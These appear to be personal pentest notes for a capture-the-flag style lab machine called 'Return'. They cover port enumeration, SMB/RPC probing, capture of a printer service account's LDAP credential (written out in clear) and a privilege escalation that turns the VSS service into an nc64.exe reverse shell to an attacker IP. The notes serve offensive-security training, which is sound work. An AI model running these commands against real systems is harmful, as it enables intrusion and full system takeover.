### Enumeration
```
IP=10.10.10.10
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 53
	- DNS
- 80
	- Microsoft IIS httpd 10.0
- 88
	- kerberos
- 135
	- RPC
- 139
	- RPC
- 389
	- Microsoft Windows Active Directory LDAP (in: return.local0., Site: Default-First-Site-Name)
- 445
	- smb
- 464
	- kpasswd5
- 593
	- RPC
- 636
	- tcpwrapped
- 3268
	- Microsoft Windows Active Directory LDAP (in: return.local0., Site: Default-First-Site-Name)
- 3269
	- tcpwrapped
- 5985
	- winrm
- 9389
	- .NET Message Framing
- 47001
	- RPC
- 49152-49158
	- RPC
- 49169
	- RPC
- 49170
	- RPC
- 49179
	- RPC
### Foothold
- DNS
	- nslookup
		- server $IP
		- 127.0.0.1
	- dig @$IP domain
		- If domain resolves
			- dig axfr @$IP domain
- RPC/ SMB
	- enum4linux $IP
	- crackmapexec smb $IP -u guest -p "" --rid-brute
	- crackmapexec smb $IP -u "" -p "" --pass-pol
	- rpcclient -U '' $IP
		- enumdomusers
		- queryusergroups RID
		- queryuser RID
- 445
	- smbclient -N -L //$IP
		- access denied
	- nmap --script smb-vuln* -p135,139,445 $IP
- 80
	- Default landing page
		- ![[Pasted image 20240827124346.png]]
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
			- /settings.php
				- ![[Pasted image 20240827124400.png]]
				- Change IP to A_IP
				- nc -lvnp 389
				- Run update
					- `return\svc-printer:1edFg43012!!
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
- svc-printer
	- crackmapexec smb 10.10.11.108 --shares -u svc-printer -p '1edFg43012!!'
		- READ WRITE over C$
	- evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
### PE
#### Windows
- svc-printer
	- whoami /all
		- SeMachineAccountPrivilege  - add account a machine to domain
		- SeLoadDriverPrivilege  -  vulnerable driver and exploiting
			- https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system
		- SeBackupPrivilege - get arbitrary file read
			- https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup
	- Root drive directory
	- net user USERNAME
		- Check group memberships
		- Server Operators
			- Allows us to modify services
			- Upload nc.exe to target
			- Option 1
				- `sc.exe config VSS binpath="C:\programdata\nc64.exe -e cmd A_IP 443"
				- sc.exe stop VSS
				- nc -lvnp 443
				- sc.exe start VSS
			- Option2
				- `sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
				- nc -lvnp 443
				- sc.exe start VSS
### Credentials
### Lessons Learned